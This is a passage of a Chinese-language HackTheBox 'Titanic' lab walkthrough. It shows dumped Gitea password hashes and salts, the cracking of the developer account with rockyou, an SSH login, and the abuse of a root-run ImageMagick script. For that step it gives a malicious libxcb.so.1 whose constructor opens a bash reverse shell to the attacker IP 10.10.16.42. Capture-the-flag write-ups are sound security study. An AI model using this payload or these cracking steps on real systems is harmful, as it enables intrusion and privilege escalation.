class=\"hljs-string\">\".help\"</span> <span class=\"hljs-keyword\">for</span> usage hints.\nsqlite> \nsqlite> select * <span class=\"hljs-keyword\">from</span> user;\n<span class=\"hljs-number\">1</span>|administrator|administrator||root@titanic.htb|<span class=\"hljs-number\">0</span>|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$<span class=\"hljs-number\">50000</span>$<span class=\"hljs-number\">50</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>||<span class=\"hljs-number\">0</span>|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||<span class=\"hljs-number\">1722595379</span>|<span class=\"hljs-number\">1722597477</span>|<span class=\"hljs-number\">1722597477</span>|<span class=\"hljs-number\">0</span>|-<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">0</span>|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>||gitea-auto|<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">2</span>|developer|developer||developer@titanic.htb|<span class=\"hljs-number\">0</span>|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$<span class=\"hljs-number\">50000</span>$<span class=\"hljs-number\">50</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>||<span class=\"hljs-number\">0</span>|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||<span class=\"hljs-number\">1722595646</span>|<span class=\"hljs-number\">1740059263</span>|<span class=\"hljs-number\">1740059263</span>|<span class=\"hljs-number\">0</span>|-<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">0</span>|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">2</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>||gitea-auto|<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">3</span>|sdgeek|sdgeek||sdgeek@hackers-home.com|<span class=\"hljs-number\">0</span>|enabled|c573bec092520ea80e109d9b6139b9743c5da3a87e10b9c4b09be90cab8597775b4706d1b003e5bd05d8fb9149d66f75eeb3|pbkdf2$<span class=\"hljs-number\">50000</span>$<span class=\"hljs-number\">50</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>||<span class=\"hljs-number\">0</span>|||2b4667f935725dad4735ce458d7e6763|000e6d5ed0b72df01c823d8a208709f5|en-US||<span class=\"hljs-number\">1740054694</span>|<span class=\"hljs-number\">1740054694</span>|<span class=\"hljs-number\">1740054694</span>|<span class=\"hljs-number\">0</span>|-<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">0</span>|70a933c63c214a02539f4ad8bfc2480f|sdgeek@hackers-home.com|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>||gitea-auto|<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">4</span>|johndoe|johndoe||john@mail.com|<span class=\"hljs-number\">0</span>|enabled|1d19a1d61d6c723d5b072998bd8f9148044236e18f1ce28d48152e42fd4349ce2900b16cf223cacec079c3c675e595b69485|pbkdf2$<span class=\"hljs-number\">50000</span>$<span class=\"hljs-number\">50</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>||<span class=\"hljs-number\">0</span>|||1cca2b09f6015581a78dbc7523a8cb1b|3c0e5ef0a6d4ef9d5b23d01c0b771693|en-US||<span class=\"hljs-number\">1740056823</span>|<span class=\"hljs-number\">1740059204</span>|<span class=\"hljs-number\">1740059204</span>|<span class=\"hljs-number\">0</span>|-<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">0</span>|97c712aa60976209ae6d1c741b1338d3|john@mail.com|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>||gitea-auto|<span class=\"hljs-number\">0</span>\n</code></pre>\n<p>再看表结构</p>\n<pre><code class=\"hljs language-python\">sqlite> pragma table_info(user);\n<span class=\"hljs-number\">0</span>|<span class=\"hljs-built_in\">id</span>|INTEGER|<span class=\"hljs-number\">1</span>||<span class=\"hljs-number\">1</span>\n<span class=\"hljs-number\">1</span>|lower_name|TEXT|<span class=\"hljs-number\">1</span>||<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">2</span>|name|TEXT|<span class=\"hljs-number\">1</span>||<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">3</span>|full_name|TEXT|<span class=\"hljs-number\">0</span>||<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">4</span>|email|TEXT|<span class=\"hljs-number\">1</span>||<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">5</span>|keep_email_private|INTEGER|<span class=\"hljs-number\">0</span>||<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">6</span>|email_notifications_preference|TEXT|<span class=\"hljs-number\">1</span>|<span class=\"hljs-string\">'enabled'</span>|<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">7</span>|passwd|TEXT|<span class=\"hljs-number\">1</span>||<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">8</span>|passwd_hash_algo|TEXT|<span class=\"hljs-number\">1</span>|<span class=\"hljs-string\">'argon2'</span>|<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">9</span>|must_change_password|INTEGER|<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">10</span>|login_type|INTEGER|<span class=\"hljs-number\">0</span>||<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">11</span>|login_source|INTEGER|<span class=\"hljs-number\">1</span>|<span class=\"hljs-number\">0</span>|<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">12</span>|login_name|TEXT|<span class=\"hljs-number\">0</span>||<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">13</span>|<span class=\"hljs-built_in\">type</span>|INTEGER|<span class=\"hljs-number\">0</span>||<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">14</span>|location|TEXT|<span class=\"hljs-number\">0</span>||<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">15</span>|website|TEXT|<span class=\"hljs-number\">0</span>||<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">16</span>|rands|TEXT|<span class=\"hljs-number\">0</span>||<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">17</span>|salt|TEXT|<span class=\"hljs-number\">0</span>||<span class=\"hljs-number\">0</span>\n</code></pre>\n<p>我们知道靶机上存在<code>developer</code>用户，所以我们将其密码拉取下来</p>\n<p>经查询<code>gitea</code>是使用<code>PBKDF2</code> 算法进行哈希 <a href=\"https://github.com/dvdknaap/gitea-crack-passwords\">https://github.com/dvdknaap/gitea-crack-passwords</a></p>\n<p><code>50000</code>是迭代次数， <code>8bf3e3452b78544f8bee9400d6936d34</code>是盐值，执行爆破</p>\n<pre><code class=\"hljs language-python\">python ../../Tools/gitTeaPassCrack.py -s 8bf3e3452b78544f8bee9400d6936d34 -t e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56 -w /usr/share/wordlists/rockyou.txt\nFound password: <span class=\"hljs-number\">25282528</span>\n</code></pre>\n<h2>提权</h2>\n<p>登录<code>SSH</code></p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~/Desktop/test/titanic  ssh developer@<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.55</span>           \nThe authenticity of host <span class=\"hljs-string\">'10.10.11.55 (10.10.11.55)'</span> can<span class=\"hljs-string\">'t be established.\nED25519 key fingerprint is SHA256:Ku8uHj9CN/ZIoay7zsSmUDopgYkPmN7ugINXU0b2GEQ.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '</span><span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.55</span><span class=\"hljs-string\">' (ED25519) to the list of known hosts.\ndeveloper@10.10.11.55'</span>s password: \nWelcome to Ubuntu <span class=\"hljs-number\">22.04</span><span class=\"hljs-number\">.5</span> LTS (GNU/Linux <span class=\"hljs-number\">5.15</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">131</span>-generic x86_64)\n\n * Documentation:  https://<span class=\"hljs-built_in\">help</span>.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information <span class=\"hljs-keyword\">as</span> of Thu Feb <span class=\"hljs-number\">20</span> 03:<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">27</span> PM UTC <span class=\"hljs-number\">2025</span>\n\n  System load:           <span class=\"hljs-number\">0.03</span>\n  Usage of /:            <span class=\"hljs-number\">67.6</span>% of <span class=\"hljs-number\">6.79</span>GB\n  Memory usage:          <span class=\"hljs-number\">20</span>%\n  Swap usage:            <span class=\"hljs-number\">0</span>%\n  Processes:             <span class=\"hljs-number\">257</span>\n  Users logged <span class=\"hljs-keyword\">in</span>:       <span class=\"hljs-number\">1</span>\n  IPv4 address <span class=\"hljs-keyword\">for</span> eth0: <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.55</span>\n  IPv6 address <span class=\"hljs-keyword\">for</span> eth0: dead:beef::<span class=\"hljs-number\">250</span>:56ff:feb9:dc12\n\nExpanded Security Maintenance <span class=\"hljs-keyword\">for</span> Applications <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> enabled.\n\n<span class=\"hljs-number\">0</span> updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm <span class=\"hljs-keyword\">or</span> run: sudo pro status\n\nThe <span class=\"hljs-built_in\">list</span> of available updates <span class=\"hljs-keyword\">is</span> more than a week old.\nTo check <span class=\"hljs-keyword\">for</span> new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection <span class=\"hljs-keyword\">or</span> proxy settings\n\ndeveloper@titanic:~$\n</code></pre>\n<p><code>/opt/scripts</code> 下发现<code>identify_images.sh</code> (看了<code>WP</code>)</p>\n<pre><code class=\"hljs language-python\">developer@titanic:/opt/scripts$ ls\nidentify_images.sh\n\ndeveloper@titanic:/opt/scripts$ ls -al\ntotal <span class=\"hljs-number\">12</span>\ndrwxr-xr-x <span class=\"hljs-number\">2</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">37</span> .\ndrwxr-xr-x <span class=\"hljs-number\">5</span> root root <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">37</span> ..\n-rwxr-xr-x <span class=\"hljs-number\">1</span> root root  <span class=\"hljs-number\">167</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">11</span> identify_images.sh\n\ndeveloper@titanic:/opt/scripts$ cat identify_images.sh \ncd /opt/app/static/assets/images\ntruncate -s <span class=\"hljs-number\">0</span> metadata.log\nfind /opt/app/static/assets/images/ -<span class=\"hljs-built_in\">type</span> f -name <span class=\"hljs-string\">\"*.jpg\"</span> | xargs /usr/<span class=\"hljs-built_in\">bin</span>/magick identify >> metadata.log\n</code></pre>\n<p>遍历 <code>/opt/app/static/assets/images/</code> 目录下所有的 <code>.jpg</code> 文件，使用 <code>ImageMagick</code> 的 <code>identify</code> 命令提取它们的元数据，并将结果记录到 <code>metadata.log</code> 文件中</p>\n<p>查看<code>Magick</code>版本</p>\n<pre><code class=\"hljs language-python\">developer@titanic:/opt/scripts$ magick -version\nVersion: ImageMagick <span class=\"hljs-number\">7.1</span><span class=\"hljs-number\">.1</span>-<span class=\"hljs-number\">35</span> Q16-HDRI x86_64 1bfce2a62:<span class=\"hljs-number\">20240713</span> https://imagemagick.org\nCopyright: (C) <span class=\"hljs-number\">1999</span> ImageMagick Studio LLC\nLicense: https://imagemagick.org/script/license.php\nFeatures: Cipher DPC HDRI OpenMP(<span class=\"hljs-number\">4.5</span>) \nDelegates (built-<span class=\"hljs-keyword\">in</span>): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib\nCompiler: gcc (<span class=\"hljs-number\">9.4</span>)\n\n</code></pre>\n<p>意外的有漏洞</p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~/Desktop/test/titanic  searchsploit ImageMagick     \n---------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                    |  Path\n---------------------------------------------------------------------------------- ---------------------------------\nGeekLog <span class=\"hljs-number\">2.</span>x - <span class=\"hljs-string\">'ImageImageMagick.php'</span> Remote File Inclusion                        | php/webapps/<span class=\"hljs-number\">3946.</span>txt\nImageMagick - Memory Leak                                                         | multiple/local/<span class=\"hljs-number\">45890.</span>sh\nImageMagick <span class=\"hljs-number\">6.8</span><span class=\"hljs-number\">.8</span>-<span class=\"hljs-number\">4</span> - Local Buffer Overflow (SEH)                                 | windows/local/<span class=\"hljs-number\">31688.</span>pl\nImageMagick <span class=\"hljs-number\">6.9</span><span class=\"hljs-number\">.3</span>-<span class=\"hljs-number\">9</span> / <span class=\"hljs-number\">7.0</span><span class=\"hljs-number\">.1</span>-<span class=\"hljs-number\">0</span> - <span class=\"hljs-string\">'ImageTragick'</span> Delegate Arbitrary Command Executi | multiple/local/<span class=\"hljs-number\">39791.</span>rb\nImageMagick <span class=\"hljs-number\">6.</span>x - <span class=\"hljs-string\">'.PNM'</span> Image Decoding Remote Buffer Overflow                    | linux/dos/<span class=\"hljs-number\">25527.</span>txt\nImageMagick <span class=\"hljs-number\">6.</span>x - <span class=\"hljs-string\">'.SGI'</span> Image File Remote Heap Buffer Overflow                   | linux/dos/<span class=\"hljs-number\">28383.</span>txt\nImageMagick <span class=\"hljs-number\">7.0</span><span class=\"hljs-number\">.1</span>-<span class=\"hljs-number\">0</span> / <span class=\"hljs-number\">6.9</span><span class=\"hljs-number\">.3</span>-<span class=\"hljs-number\">9</span> - <span class=\"hljs-string\">'ImageTragick '</span> Multiple Vulnerabilities          | multiple/dos/<span class=\"hljs-number\">39767.</span>txt\nImageMagick <span class=\"hljs-number\">7.1</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">49</span> - Arbitrary File Read                                        | multiple/local/<span class=\"hljs-number\">51261.</span>txt\nImageMagick <span class=\"hljs-number\">7.1</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">49</span> - DoS                                                        | php/dos/<span class=\"hljs-number\">51256.</span>txt\nWordpress Plugin ImageMagick-Engine <span class=\"hljs-number\">1.7</span><span class=\"hljs-number\">.4</span> - Remote Code Execution (RCE) (Authenti | php/webapps/<span class=\"hljs-number\">51025.</span>txt\n---------------------------------------------------------------------------------- ---------------------------------\n\n</code></pre>\n<p>搜索<code>POC</code>：<a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8</a></p>\n<p><code>POC</code>验证版本与靶机版本一模一样</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Titanic/image10.png\" alt=\"image.png\"></p>\n<p>我们知道脚本工作路径是在<code>/opt/app/static/assets/images/</code> 我们在其目录创建一个运行库文件</p>\n<pre><code class=\"hljs language-python\">gcc -x c -shared -fPIC -o ./libxcb.so<span class=\"hljs-number\">.1</span> - &#x3C;&#x3C; EOF\n<span class=\"hljs-comment\">#include &#x3C;stdio.h></span>\n<span class=\"hljs-comment\">#include &#x3C;stdlib.h></span>\n<span class=\"hljs-comment\">#include &#x3C;unistd.h></span>\n\n__attribute__((constructor)) void init(){\n    system(<span class=\"hljs-string\">\"bash -c 'bash -i >&#x26; /dev/tcp/10.10.16.42/1234 0>&#x26;1'\"</span>);\n    exit(<span class=\"hljs-number\">0</span>);\n}\nEOF\n</code></pre>\n<p>等待脚本执行（包会执行的），拿到root权限以及<code>RootFlag</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Titanic/image11.png\" alt=\"image.png\"></p>","title":"HackTheBox - Season7-Titanic","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["HackTheBox","Linux靶机","encrypt"],"categories":"靶机","description":"Season7-Titanic\n\n https://app.hackthebox.com/competitive/7/overview | `esay` | 漏洞有点难找，我觉得中等左右\n \n\n前期踩点\n\n\n\n\n\n\n\n子域名查询，发现`dev`，添加到`hosts`里面去\n\n\n\n访问`dev` ，`gitea`服务\n\n\n\n访问`HTTP`服务，是关于泰塔尼克号的订票服务\n\n\n\n点击`BookYou...","isEncrypted":true},"recentPosts":[{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"},{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"HackTheBoxMachine - Scepter","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"}]},"__N_SSG":true}